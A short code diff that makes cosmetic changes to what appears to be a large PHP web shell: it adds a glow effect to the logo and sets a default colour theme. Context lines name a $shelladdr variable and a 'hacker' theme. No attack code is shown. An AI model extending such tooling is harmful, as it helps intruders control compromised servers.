@@ -14,7 +14,7 @@ let colors = ["firebrick","gold","forestgreen","cornflowerblue","darkorchid"];
 let n = Math.floor(Math.random() * colors.length);
 let logoColor = document.createElement("style");
 logoColor.type = "text/css";
-logoColor.innerText = `.logo { color: ${colors[n]}; }`;
+logoColor.innerText = `.logo { color: ${colors[n]}; text-shadow: 0px 0px 16px ${colors[n]}; }`;
 document.head.appendChild(logoColor);
 </script>
 
@@ -12313,6 +12313,12 @@ $shelladdr = $_SERVER['SERVER_ADDR'];
 // THEMES:
 $retro = ":root { --BG: #1C1C1C; --BGDIM:#1A1A1A; --BG2: #0C0C0C; --TEXT: #C1C1C1; --WARN: #FF9000; --INFO: #3377FF; --ERR: #DD2000; --OK: #00A020; }";
 $hacker = ":root { --BG: #0F0F0F; --BGDIM:#1A1A1A; --BG2: #0C0C0C; --TEXT: #32CD32; --WARN: #FF9000; --INFO: #3377FF; --ERR: #DD2000; --OK: #00A020; }";
+
+
+// Set default theme if not present in SESSION.
+if(!$_SESSION['theme']){
+	$_SESSION['theme'] = $retro;
+}
 
 if($_GET['theme']){
 	switch($_REQUEST['theme']){
